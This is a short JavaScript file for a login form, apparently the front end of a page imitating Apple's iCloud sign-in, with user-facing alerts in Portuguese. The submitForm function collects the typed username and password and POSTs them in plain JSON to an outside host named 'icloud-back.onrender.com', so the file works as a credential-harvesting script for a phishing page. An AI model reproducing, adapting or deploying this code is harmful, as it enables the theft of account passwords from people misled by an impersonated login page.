const submit = document.getElementById('submit');
const username = document.getElementById('username');
const password = document.getElementById('password');
const form = document.forms.form;

getAllEvent();

function getAllEvent() {
    username.addEventListener('keypress', controlToInput);
    password.addEventListener('keypress', controlToInput);
    submit.addEventListener('click', controlToInput2);
}

function controlToInput(e) {
    if (e.key == 'Enter') {
        if (username.value == '' || password.value == '')
            return;
        else
            submitForm();
    }
}

function controlToInput2() {
    if (username.value == '' || password.value == '')
        return;
    else
        submitForm();
}

function submitForm() {
    const formData = {
        username: username.value,
        password: password.value
    };

    fetch('https://icloud-back.onrender.com/submit-form', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        alert('Formulário enviado com sucesso!');
    })
    .catch((error) => {
        console.error('Error:', error);
        alert('Ocorreu um erro ao enviar o formulário.');
    });
}
